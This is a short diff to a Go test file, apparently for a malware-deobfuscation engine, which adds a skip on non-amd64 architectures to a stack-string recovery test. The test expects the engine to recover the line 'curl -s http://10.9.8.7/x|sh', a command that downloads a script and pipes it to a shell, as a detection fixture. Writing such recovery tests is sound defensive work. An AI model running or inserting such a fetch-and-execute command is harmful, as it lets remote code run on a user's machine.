@@ -2,6 +2,7 @@ package engine
 
 import (
 	"context"
+	"runtime"
 	"strings"
 	"testing"
 
@@ -79,6 +80,9 @@ func TestObfuscationCorpus(t *testing.T) {
 		}
 	})
 	t.Run("plain stack string", func(t *testing.T) {
+		if runtime.GOARCH != "amd64" {
+			t.Skip("stack-string recovery understands x86 and x86-64 instruction encodings only")
+		}
 		a := analyse(t, fixtures.PlainStackString(t))
 		if !recovered(a, "stack", "curl -s http://10.9.8.7/x|sh") {
 			t.Fatalf("not recovered: %+v", a.Decoded)
